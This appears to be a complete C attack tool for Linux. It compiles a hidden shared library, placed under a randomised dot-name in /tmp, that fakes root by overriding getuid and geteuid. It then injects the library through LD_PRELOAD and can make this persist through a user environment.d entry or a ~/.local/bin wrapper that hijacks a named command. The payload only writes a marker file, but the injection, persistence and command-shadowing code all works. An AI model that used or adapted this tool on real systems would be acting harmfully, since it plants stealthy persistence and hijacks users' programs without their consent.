#define _GNU_SOURCE
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pwd.h>

static const char SO_SRC[] =
"#define _GNU_SOURCE\n"
"#include <dlfcn.h>\n"
"#include <unistd.h>\n"
"#include <stdio.h>\n"
"#include <stdlib.h>\n"
"\n"
"\n"
"__attribute__((constructor))\n"
"static void on_load(void) {\n"
"    \n"
"    \n"
"    FILE *f = fopen(\"/tmp/preload_hit.txt\", \"w\");\n"
"    if (f) { fprintf(f, \"preload hit uid=%d\\n\", getuid()); fclose(f); }\n"
"}\n"
"\n"
"\n"
"uid_t getuid(void) {\n"
"    return 0;\n"
"}\n"
"uid_t geteuid(void) {\n"
"    return 0;\n"
"}\n";

static void rand_path(char *out, size_t n, const char *suffix)
{
    unsigned r;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) { read(fd, &r, sizeof(r)); close(fd); }
    else r = (unsigned)getpid() ^ 0xdeadbeef;
    snprintf(out, n, "/tmp/.%08x%s", r, suffix);
}

static int build_so(const char *so_path)
{
    char src_path[64];
    rand_path(src_path, sizeof(src_path), ".c");

    FILE *f = fopen(src_path, "w");
    if (!f) { perror("fopen so_src"); return -1; }
    fputs(SO_SRC, f); fclose(f);

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "gcc -O2 -shared -fPIC -nostartfiles "
             "-o %s %s -ldl 2>/dev/null",
             so_path, src_path);
    int r = system(cmd);
    unlink(src_path);
    if (r != 0) {
        fprintf(stderr, "[-] .so build failed\n"); return -1;
    }
    printf("[+] .so built: %s\n", so_path);
    return 0;
}

static int exec_with_preload(const char *so_path, const char *target_bin)
{
    printf("[*] exec %s  LD_PRELOAD=%s\n", target_bin, so_path);
    setenv("LD_PRELOAD", so_path, 1);
    char *argv[] = { (char *)target_bin, NULL };
    execve(target_bin, argv, environ);
    perror("execve"); return -1;
}

static int persist_via_env_d(const char *so_path)
{
    struct passwd *pw = getpwuid(getuid());
    if (!pw) { perror("getpwuid"); return -1; }

    char dir[512];
    snprintf(dir, sizeof(dir), "%s/.config/environment.d", pw->pw_dir);
    mkdir(dir, 0700);

    char conf[512];
    snprintf(conf, sizeof(conf), "%s/99-env.conf", dir);

    FILE *f = fopen(conf, "w");
    if (!f) { perror("fopen env.d"); return -1; }
    fprintf(f, "LD_PRELOAD=%s\n", so_path);
    fclose(f);
    printf("[+] session persist: %s\n", conf);
    printf("[*] active on next systemd-user login\n");
    return 0;
}

static int install_wrapper(const char *so_path, const char *bin_name)
{
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return -1;

    char bindir[512], binpath[512];
    snprintf(bindir, sizeof(bindir), "%s/.local/bin", pw->pw_dir);
    mkdir(bindir, 0755);
    snprintf(binpath, sizeof(binpath), "%s/%s", bindir, bin_name);

    FILE *f = fopen(binpath, "w");
    if (!f) { perror("fopen wrapper"); return -1; }
    fprintf(f, "#!/bin/sh\n"
               "LD_PRELOAD=%s exec $(which --skip-alias %s) \"$@\"\n",
               so_path, bin_name);
    fclose(f);
    chmod(binpath, 0755);
    printf("[+] wrapper: %s\n", binpath);
    printf("[*] make sure ~/.local/bin is first in PATH\n");
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <--so-only|--exec|--persist|--wrapper>\n", argv[0]);
        return 1;
    }

    char so_path[64];
    rand_path(so_path, sizeof(so_path), ".so");

    if (strcmp(argv[1], "--so-only") == 0 && argc >= 3) {
        strncpy(so_path, argv[2], sizeof(so_path) - 1);
        return build_so(so_path) < 0 ? 1 : 0;
    }

    if (build_so(so_path) < 0) return 1;

    if (strcmp(argv[1], "--exec") == 0 && argc >= 3)
        return exec_with_preload(so_path, argv[2]);

    if (strcmp(argv[1], "--persist") == 0)
        return persist_via_env_d(so_path) < 0 ? 1 : 0;

    if (strcmp(argv[1], "--wrapper") == 0 && argc >= 3)
        return install_wrapper(so_path, argv[2]) < 0 ? 1 : 0;

    fprintf(stderr, "[-] unknown argument\n");
    return 1;
}
